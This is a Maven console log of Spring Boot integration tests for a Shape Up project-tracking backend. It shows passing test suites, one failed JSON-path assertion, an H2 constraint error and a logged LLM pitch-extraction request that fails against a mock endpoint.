[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.DashboardWidgetControllerIntegrationTest
2026-01-17T23:26:38.245Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Bulk updated 2 widgets for user 1
2026-01-17T23:26:38.254Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Deleted widget 3
2026-01-17T23:26:38.276Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Updated widget 7
2026-01-17T23:26:38.288Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Created widget NEW_WIDGET for user 6
2026-01-17T23:26:38.305Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.DashboardWidgetService   : Reset widgets to defaults for user 7
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.109 s -- in com.github.farzadsedaghatbin.shipflow.controller.DashboardWidgetControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.BettingTableControllerIntegrationTest
[INFO] Tests run: 15, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.179 s -- in com.github.farzadsedaghatbin.shipflow.controller.BettingTableControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.HillChartControllerIntegrationTest
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.080 s -- in com.github.farzadsedaghatbin.shipflow.controller.HillChartControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.QAControllerIntegrationTest
[WARNING] Tests run: 1, Failures: 0, Errors: 0, Skipped: 1, Time elapsed: 0 s -- in com.github.farzadsedaghatbin.shipflow.controller.QAControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.QATestManagementControllerIntegrationTest
2026-01-17T23:26:38.635Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.BugReportService  : Created bug report: BUG-002 by user: 15
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.098 s -- in com.github.farzadsedaghatbin.shipflow.controller.QATestManagementControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$ResolveCircuitBreakerTests
2026-01-17T23:26:38.694Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Type mismatch for parameter 'newStatus': received 'INVALID_STATUS', expected type 'PitchStatus'
2026-01-17T23:26:38.709Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CircuitBreakerService    : Circuit breaker resolved for pitch 42, new status: IN_PROGRESS

MockHttpServletRequest:
      HTTP Method = POST
      Request URI = /api/circuit-breaker/pitch/42/resolve
       Parameters = {newStatus=[IN_PROGRESS]}
          Headers = []
             Body = null
    Session Attrs = {}

Handler:
             Type = com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerController
           Method = com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerController#resolve(Long, PitchStatus)

Async:
    Async started = false
     Async result = null

Resolved Exception:
             Type = null

ModelAndView:
        View name = null
             View = null
            Model = null

FlashMap:
       Attributes = null

MockHttpServletResponse:
           Status = 200
    Error message = null
          Headers = [Vary:"Origin", "Access-Control-Request-Method", "Access-Control-Request-Headers", Content-Type:"application/json", X-Content-Type-Options:"nosniff", X-XSS-Protection:"0", Cache-Control:"no-cache, no-store, max-age=0, must-revalidate", Pragma:"no-cache", Expires:"0", X-Frame-Options:"SAMEORIGIN"]
     Content type = application/json
             Body = {"pitchId":42,"pitchTitle":"Recovering Pitch","appetiteDays":5.0,"daysSpent":0.0,"hoursSpent":0.0,"utilizationPercentage":0.0,"overflowPercentage":-100.0,"isOverflowing":false,"isCircuitBreakerTriggered":false,"status":"IN_PROGRESS"}
    Forwarded URL = null
   Redirected URL = null
          Cookies = []
[ERROR] Tests run: 3, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.036 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$ResolveCircuitBreakerTests
[ERROR] com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$ResolveCircuitBreakerTests.shouldResolveCircuitBreaker -- Time elapsed: 0.011 s <<< FAILURE!
java.lang.AssertionError: No value at JSON path "$.circuitBreakerReason"
	at org.springframework.test.util.JsonPathExpectationsHelper.evaluateJsonPath(JsonPathExpectationsHelper.java:302)
	at org.springframework.test.util.JsonPathExpectationsHelper.assertValue(JsonPathExpectationsHelper.java:73)
	at org.springframework.test.web.servlet.result.JsonPathResultMatchers.lambda$value$0(JsonPathResultMatchers.java:87)
	at org.springframework.test.web.servlet.MockMvc$1.andExpect(MockMvc.java:214)
	at com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$ResolveCircuitBreakerTests.shouldResolveCircuitBreaker(CircuitBreakerControllerIntegrationTest.java:290)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: com.jayway.jsonpath.PathNotFoundException: No results for path: $['circuitBreakerReason']

[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$KillPitchTests
2026-01-17T23:26:38.732Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CircuitBreakerService    : Pitch 44 killed due to overflow: Unable to cut scope enough to meet appetite. Core problem different than shaped.
2026-01-17T23:26:38.732Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Pitch 44 has no team assigned - sending Slack notification only
2026-01-17T23:26:38.734Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : No active Slack configuration found, skipping notification
2026-01-17T23:26:38.734Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created pitch killed notifications for pitch 44 (0 team members, Slack sent)
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.030 s -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$KillPitchTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$TriggerCircuitBreakerTests
2026-01-17T23:26:38.758Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CircuitBreakerService    : Circuit breaker triggered for pitch 45: Pitch has exceeded appetite by 12.5% with unexpected API integration complexity
2026-01-17T23:26:38.758Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Pitch 45 has no team assigned - sending Slack notification only
2026-01-17T23:26:38.759Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.slack.SlackIntegrationService  : No active Slack configuration found, skipping notification
2026-01-17T23:26:38.759Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Created circuit breaker triggered notifications for pitch 45 (0 team members, Slack sent)
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.026 s -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$TriggerCircuitBreakerTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$GetTriggeredTests
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.019 s -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$GetTriggeredTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$DetectOverflowTests
[INFO] Tests run: 5, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.044 s -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest$DetectOverflowTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.160 s -- in com.github.farzadsedaghatbin.shipflow.controller.CircuitBreakerControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.WorkLogTimerControllerIntegrationTest
2026-01-17T23:26:38.859Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 1 for person Test Person
2026-01-17T23:26:38.871Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 2 for person Test Person
2026-01-17T23:26:38.873Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Cancelled timer 2 for person Test Person
2026-01-17T23:26:38.898Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 3 for person Test Person
2026-01-17T23:26:38.907Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 4 for person Test Person
2026-01-17T23:26:39.017Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Stopped timer 4 and created work log 7 for 0.25 hours
2026-01-17T23:26:39.039Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 5 for person Test Person
2026-01-17T23:26:39.051Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.WorkLogTimerService      : Started timer 6 for person Test Person
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.215 s -- in com.github.farzadsedaghatbin.shipflow.controller.WorkLogTimerControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.UserControllerIntegrationTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 1.164 s -- in com.github.farzadsedaghatbin.shipflow.controller.UserControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.TaskControllerIntegrationTest
[INFO] Tests run: 22, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.174 s -- in com.github.farzadsedaghatbin.shipflow.controller.TaskControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.PermissionControllerIntegrationTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:40.405Z  INFO 89700 --- [shipflow] [           main] .s.c.PermissionControllerIntegrationTest : Starting PermissionControllerIntegrationTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:40.405Z DEBUG 89700 --- [shipflow] [           main] .s.c.PermissionControllerIntegrationTest : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:40.405Z  INFO 89700 --- [shipflow] [           main] .s.c.PermissionControllerIntegrationTest : The following 1 profile is active: "test"
2026-01-17T23:26:40.641Z  INFO 89700 --- [shipflow] [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
2026-01-17T23:26:40.642Z  INFO 89700 --- [shipflow] [           main] o.h.c.internal.RegionFactoryInitiator    : HHH000026: Second-level cache disabled
2026-01-17T23:26:40.645Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-4 - Starting...
2026-01-17T23:26:40.645Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.pool.HikariPool        : HikariPool-4 - Added connection conn50: url=jdbc:h2:mem:testdb user=SA
2026-01-17T23:26:40.646Z  INFO 89700 --- [shipflow] [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-4 - Start completed.
2026-01-17T23:26:40.646Z  WARN 89700 --- [shipflow] [           main] org.hibernate.orm.deprecation            : HHH90000025: H2Dialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
2026-01-17T23:26:40.958Z  INFO 89700 --- [shipflow] [           main] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
2026-01-17T23:26:41.011Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:41.012Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:41.391Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing embedding model: all-MiniLM-L6-v2
2026-01-17T23:26:41.394Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.QAConfig           : Initializing in-memory embedding store for development
2026-01-17T23:26:41.422Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AIConfig           : Initializing AI with RunPod Serverless GPU - Model: mistral:instruct, URL: http://localhost:8080/mock
2026-01-17T23:26:41.578Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ConversationManager   : ConversationManager initialized with in-memory provider
2026-01-17T23:26:41.579Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.qa.FeedbackLearningService     : FeedbackLearningService initialized with in-memory provider
2026-01-17T23:26:41.580Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : LLMCacheService initialized with in-memory provider
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/index.html']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/favicon.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/assets/**']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.js']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.css']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.png']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.svg']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ico']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.json']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.woff2']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:41.911Z  WARN 89700 --- [shipflow] [           main] o.s.s.c.a.web.builders.WebSecurity       : You are asking Spring Security to ignore Ant [pattern='/*.ttf']. This is not recommended -- please use permitAll via HttpSecurity#authorizeHttpRequests instead.
2026-01-17T23:26:42.049Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:42.062Z  INFO 89700 --- [shipflow] [           main] .s.c.PermissionControllerIntegrationTest : Started PermissionControllerIntegrationTest in 1.665 seconds (process running for 27.513)
2026-01-17T23:26:42.235Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Updated permission ID 1: new description = Updated: QA can create bugs for testing
2026-01-17T23:26:42.724Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 4

MockHttpServletRequest:
      HTTP Method = GET
      Request URI = /api/permissions
       Parameters = {}
          Headers = []
             Body = null
    Session Attrs = {}

Handler:
             Type = com.github.farzadsedaghatbin.shipflow.controller.PermissionController
           Method = com.github.farzadsedaghatbin.shipflow.controller.PermissionController#getAllPermissions()

Async:
    Async started = false
     Async result = null

Resolved Exception:
             Type = null

ModelAndView:
        View name = null
             View = null
            Model = null

FlashMap:
       Attributes = null

MockHttpServletResponse:
           Status = 200
    Error message = null
          Headers = [Vary:"Origin", "Access-Control-Request-Method", "Access-Control-Request-Headers", Content-Type:"application/json", X-Content-Type-Options:"nosniff", X-XSS-Protection:"0", Cache-Control:"no-cache, no-store, max-age=0, must-revalidate", Pragma:"no-cache", Expires:"0", X-Frame-Options:"SAMEORIGIN"]
     Content type = application/json
             Body = [{"id":6,"role":"QA","resourceType":"BUG","permissionType":"CREATE","description":"QA can create bugs","createdAt":"2026-01-17T23:26:43.018413"}]
    Forwarded URL = null
   Redirected URL = null
          Cookies = []
2026-01-17T23:26:44.226Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 14
2026-01-17T23:26:44.227Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Deleted permission with ID: 15
2026-01-17T23:26:44.227Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Bulk deleted 2 permissions
2026-01-17T23:26:44.519Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: DEVELOPER - PITCH - APPROVE
2026-01-17T23:26:44.821Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: DEVELOPER - CYCLE - READ
2026-01-17T23:26:44.822Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.PermissionService        : Created permission: DEVELOPER - CYCLE - CREATE
[INFO] Tests run: 18, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 4.430 s -- in com.github.farzadsedaghatbin.shipflow.controller.PermissionControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest
2026-01-17T23:26:44.854Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: document_1_0
2026-01-17T23:26:44.854Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested document: pitch-notes.txt (ID: 1)
2026-01-17T23:26:44.854Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Document uploaded successfully: pitch-notes.txt (txt)
2026-01-17T23:26:44.884Z  WARN 89700 --- [shipflow] [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : SQL Error: 23502, SQLState: 23502
2026-01-17T23:26:44.884Z ERROR 89700 --- [shipflow] [           main] o.h.engine.jdbc.spi.SqlExceptionHelper   : NULL not allowed for column "ENTITY_ID"; SQL statement:
insert into knowledge_items (author_id,chunk_index,content,content_hash,created_at,cycle_id,embedding_id,entity_id,entity_type,is_embedded,pitch_id,team_id,title,total_chunks,updated_at,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default) [23502-224]
2026-01-17T23:26:44.888Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.controller.DocumentController    : Failed to add linked document to knowledge base: could not execute statement [NULL not allowed for column "ENTITY_ID"; SQL statement:
insert into knowledge_items (author_id,chunk_index,content,content_hash,created_at,cycle_id,embedding_id,entity_id,entity_type,is_embedded,pitch_id,team_id,title,total_chunks,updated_at,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default) [23502-224]] [insert into knowledge_items (author_id,chunk_index,content,content_hash,created_at,cycle_id,embedding_id,entity_id,entity_type,is_embedded,pitch_id,team_id,title,total_chunks,updated_at,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)]; SQL [insert into knowledge_items (author_id,chunk_index,content,content_hash,created_at,cycle_id,embedding_id,entity_id,entity_type,is_embedded,pitch_id,team_id,title,total_chunks,updated_at,id) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,default)]; constraint [null]
2026-01-17T23:26:44.901Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.PitchShapingExtractorService   : Extracting pitch data from document (326 chars)
2026-01-17T23:26:44.901Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 1719 chars
2026-01-17T23:26:44.902Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are an expert at analyzing Shape Up methodology pitch documents.\n\nAnalyze the following document and extract the key pitch elements according to Shape Up methodology.\n\nExtract the following elements (use null if not found in the document):\n\n1. **title**: A concise title for the pitch (extract or generate from content)\n2. **problemStatement**: The problem being solved. What is the pain point? Why does this matter?\n3. **solution**: The proposed solution. What is being built? Include any described approach or fat-marker sketch ideas.\n4. **rabbitHoles**: Areas to avoid, edge cases that should be out of scope, potential time sinks.\n5. **risks**: Known risks, technical challenges, unknowns, or dependencies.\n6. **noGos**: Things explicitly out of scope. What we are NOT building.\n7. **appetiteDays**: Estimated time appetite in days (if mentioned). Default to null if not specified.\n8. **wireframeLinks**: Any mentioned links to wireframes, prototypes, Figma, or visual references.\n\nDOCUMENT CONTENT:\n---\nProblem: Users struggle to track project progress effectively.\n\nSolution: Create a comprehensive dashboard with real-time updates.\n\nRabbit Holes: Don't get stuck on complex authentication flows.\n\nRisks: Integration with third-party APIs might be unstable.\n\nNo-Gos: We won't build a mobile app in this cycle.\n\nAppetite: 6 weeks\n---\n\nRespond ONLY with a valid JSON object in this exact format (no markdown, no explanation):\n{\n    \"title\": \"string or null\",\n    \"problemStatement\": \"string or null\",\n    \"solution\": \"string or null\",\n    \"rabbitHoles\": \"string or null\",\n    \"risks\": \"string or null\",\n    \"noGos\": \"string or null\",\n    \"appetiteDays\": number or null,\n    \"wireframeLinks\": \"string or null\"\n}\n"}}
2026-01-17T23:26:44.964Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:44.950958","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:44.950958","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchShapingExtractorService.extractFromDocument(PitchShapingExtractorService.java:114) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.extractPitchDataFromDocument(DocumentController.java:247) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
